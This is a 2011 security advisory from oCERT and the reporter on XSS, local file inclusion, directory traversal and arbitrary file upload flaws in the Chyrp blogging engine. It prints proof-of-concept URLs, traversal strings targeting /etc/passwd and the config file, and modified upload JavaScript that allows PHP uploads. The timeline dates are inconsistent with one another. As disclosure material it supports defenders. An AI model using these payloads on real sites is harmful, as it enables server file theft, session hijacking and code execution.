Subject: [oCERT-2011-001] Chyrp input sanitization errors

#2011-001 Chyrp input sanitization errors

Description:

The Chyrp framework, an open source blogging engine, suffers from cross-site
scripting (XSS) and local file inclusion (LFI) vulnerabilities.

Insufficient input sanitization on the parameters passed to pages related to
administration settings, the javascript handler and the index handler leads to
arbitrary javascript injection in the context of the user session. This could
be potentially exploited to hijack the session of the administrator.

Insufficient path sanitization on the root 'action' query string parameter
leads to inclusion of arbitrary files from local sources, this could be
exploited to read arbitrary accessible files on the hosting server filesystem
and potentially execute arbitrary commands or code.

Affected version:

Chyrp <= 2.1

Fixed version:

Chyrp, N/A

Credit: vulnerability report and PoC code received from Eldar Marcussen
<wireghoul [at] justanotherhacker [dot] com>.

CVE: N/A

Timeline:

2011-05-17: vulnerability report received
2010-05-17: contacted chyrp maintainers
2010-07-13: oCERT advisory published jointly with reporter advisory

This advisory covers 3 CVEs (but the oCERT advisory only seems to cover
the first two):

XSS: CVE-2011-2743

LFI/directory traversal: CVE-2011-2744

file upload: CVE-2011-2745

20110713 - Justanotherhacker.com : Chyrp - Multiple vulnerabilties
JAHx113 - http://www.justanotherhacker.com/advisories/JAHx113.txt
--------------------------------------------------------------------------------------------
Chyrp is a blogging engine designed to be very lightweight while retaining functionality. It
is powered by PHP and has very powerful theme and extension engines, so you can personalize
it however you want. The code is well-documented, and it has a very strong structure that's
loosely based on the MVC design pattern
[ Taken from: http://chyrp.net ]
--- Vulnerability description ---
The chyrp blogging engine was found to suffer from multiple vulnerabilities in multiple versions.
Discovered by: Eldar "Wireghoul" Marcussen
Type: Multiple
Severity: High
Release: Responsible, via oCERT
CVE: Not yet assigned
Vendor: chyrp.net
Affected versions: <= 2.1
--- Cross site scripting ---
The action parameter is not sufficiently filtered, escaped or encoded resulting in cross site scripting.
Exploit:
http://domain/path/admin/?action=[XSS]
http://domain/path/includes/javascript.php?action=[XSS]
PoC:
The javascript.php xss can also be invoked through rewrite rules using the following querystring -
http://domain/path/?%22%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E;url=blah
--- Cross site scripting ---
The title and body parameters are not initialized in the admin/help.php file resulting in cross site
scripting if register globals is on.
Exploit:
http://domain/path/admin/help.php?title=[XSS]&body=[XSS]
--- Local file inclusion ---
The action parameter is not sufficiently filtered and vulnerable to local file inclusion.
Exploit:
http://domain/path/?action=[LFI]
PoC:
http://domain/path/?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpassword%00
--- Directory traversal ---
The file parameter for includes/lib/gz.php is vulnerable to a directory traversal bug in Chyrp versions <=2.0.
This is due to a php gotcha when using the return value of strpos in an if statement as matches on position 0
will result in a false negative.
Exploit:
http://domain/path/includes/lib/gz.php?file=/themes/../../../../../../[PATH]
PoC:
http://domain/path/includes/lib/gz.php?file=/themes/../../../../../../../../../etc/passwd
http://domain/path/includes/lib/gz.php?file=/themes/../includes/config.yaml.php
--- Arbitrary file upload ---
Arbitrary file upload can be done by authorised users in Chyrp version <= 2.0 with the swfupload extension and
file upload feathers enabled. The uploaded file extension is restricted through javascript. Modify js in page
using firebug or via intercepting proxy to allow \*.php upload. A direct POST to
http://domain/path/modules/swfupload/upload\_handler.php can also be done, but changing js is far easier.
PoC:
Appended ;\*.php in script for the add photo feather (http://domain/path/admin/?action=write\_post&feather=photo) using intercepting proxy
<script type="text/javascript">
$(function(){
$("#photo").clone().attr("id", "photo\_fake").addClass("swfupload\_button").insertBefore("#photo")
photo = new SWFUpload({
upload\_url : "http://localhost/chyrp\_v2.0/modules/swfupload/upload\_handler.php",
flash\_url : "http://localhost/chyrp\_v2.0/modules/swfupload/lib/swfupload.swf",
post\_params: {"PHPSESSID" : "5o3bnghnijk4hlr7vnshi3vb76", "PHPSESSNAME" : "ChyrpSession", "ajax" : "true" },
file\_size\_limit : "100 MB",
file\_types : "\*.jpg;\*.jpeg;\*.png;\*.gif;\*.bmp;\*.php", <-- #MODIFY!
file\_types\_description : "All Files",
file\_queue\_error\_handler : fileQueueError,
file\_dialog\_complete\_handler : fileDialogComplete,
upload\_start\_handler : uploadStart,
upload\_progress\_handler : uploadProgress,
upload\_error\_handler : uploadError,
upload\_success\_handler : uploadSuccess,
button\_placeholder\_id : "photo",
button\_width : $("#photo\_fake").width(),
button\_height : $("#photo\_fake").height(),
button\_action : SWFUpload.BUTTON\_ACTION.SELECT\_FILES,
upload\_complete\_handler : uploadComplete
})
$("#SWFUpload\_0")
.css({ position: "absolute", top: $("#photo\_fake").offset().top, left: $("#photo\_fake").offset().left })
.before('<div id="progress"><div class="back"><div class="fill"></div><div class="clear"></div></div></div>')
})
</script>
